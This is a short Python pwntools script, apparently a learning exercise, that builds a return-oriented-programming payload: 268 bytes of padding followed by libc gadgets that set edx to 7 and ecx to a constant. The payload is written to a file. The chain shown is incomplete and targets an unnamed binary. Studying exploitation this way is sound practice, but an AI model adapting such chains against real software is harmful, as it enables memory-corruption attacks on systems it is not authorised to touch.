#!/usr/bin/python3
from pwn import p32

# 0x0003b4fc: pop edx; ret;
# 0x000a07f8: inc edx; ret;
# 0x000915a3: pop ecx; ret; 

junk = b"A" * 268

libc_base = 0xf7d75000


# this rop chain could have been done much simpler by pushin on the stack 0x7 instead of 0xffffffff (which we then need to increment), but i prefer to do it like this to really "cement" the idea in my mind.
rop = b"".join([
    p32(libc_base + 0x0003b4fc),
    p32(0xffffffff),
    p32(libc_base + 0x000a07f8),
    p32(libc_base + 0x000a07f8),
    p32(libc_base + 0x000a07f8),
    p32(libc_base + 0x000a07f8),
    p32(libc_base + 0x000a07f8),
    p32(libc_base + 0x000a07f8),
    p32(libc_base + 0x000a07f8),
    p32(libc_base + 0x000a07f8),
    p32(libc_base + 0x000915a3),
    p32(0x01010101)
])


payload = junk + rop 

with open("payload", "wb") as f:
        f.write(payload)
